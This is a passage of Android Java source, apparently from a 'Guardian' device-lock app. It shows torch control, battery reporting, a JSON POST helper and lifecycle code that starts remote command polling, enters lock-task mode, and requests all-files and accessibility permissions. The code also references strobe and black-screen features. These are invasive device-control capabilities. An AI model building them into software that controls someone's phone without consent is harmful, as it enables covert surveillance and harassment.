        commandHandler.removeCallbacksAndMessages(null);
        setTorch(false);
    }

    private void setTorch(boolean on) {
        if (Build.VERSION.SDK_INT < 23) return;
        try {
            CameraManager cm = (CameraManager) getSystemService(CAMERA_SERVICE);
            if (cm == null) return;
            String cameraId = null;
            for (String id : cm.getCameraIdList()) {
                CameraCharacteristics cc = cm.getCameraCharacteristics(id);
                Boolean flash = cc.get(CameraCharacteristics.FLASH_INFO_AVAILABLE);
                Integer facing = cc.get(CameraCharacteristics.LENS_FACING);
                if (Boolean.TRUE.equals(flash) &&
                        (facing == null || facing == CameraCharacteristics.LENS_FACING_BACK)) {
                    cameraId = id;
                    break;
                }
            }
            if (cameraId != null) cm.setTorchMode(cameraId, on);
        } catch (CameraAccessException | SecurityException ignored) {}
    }

    private String batteryLevel() {
        try {
            Intent i = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            int level = i == null ? 100 : i.getIntExtra("level", 100);
            return String.valueOf(level);
        } catch (Exception e) { return "100"; }
    }

    private String postJsonResponse(String url, String json) {
        HttpURLConnection c = null;
        try {
            c = (HttpURLConnection) new URL(url).openConnection();
            c.setRequestMethod("POST"); c.setConnectTimeout(10000); c.setReadTimeout(10000);
            c.setRequestProperty("Content-Type", "application/json"); c.setDoOutput(true);
            OutputStream os = c.getOutputStream(); os.write(json.getBytes(StandardCharsets.UTF_8)); os.close();
            int code = c.getResponseCode();
            InputStream in = code >= 400 ? c.getErrorStream() : c.getInputStream();
            if (in == null) return null;
            BufferedReader br = new BufferedReader(new InputStreamReader(in, StandardCharsets.UTF_8));
            StringBuilder out = new StringBuilder(); String line;
            while ((line = br.readLine()) != null) out.append(line);
            br.close();
            return out.toString();
        } catch (Exception ignored) { return null; }
        finally { if (c != null) c.disconnect(); }
    }

    @Override protected void onResume() {
        super.onResume();
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(this)) loadWeb();
        if (getSharedPreferences("GuardianPrefs", MODE_PRIVATE).getBoolean("isLocked", false)) enterLockTaskMode();
        requestManageAllFilesPermissionIfNeeded();
        startCommandPolling();
        new Handler(Looper.getMainLooper()).postDelayed(this::promptAccessibilityForAppBlocker, 500);
    }

    @Override protected void onDestroy() {
        stopStrobe();
        stopBlackScreen();
        try { unregisterReceiver(lockReceiver); } catch (Exception ignored) {}
        try { if (persistentCommandReceiver != null) unregisterReceiver(persistentCommandReceiver); } catch (Exception ignored) {}
        if (webView != null) { webView.stopLoading(); webView.destroy(); webView = null; }
        super.onDestroy();
    }

    @Override public void onBackPressed() {
        if (webView != null && webView.canGoBack()) webView.goBack();
        else super.onBackPressed();
    }
}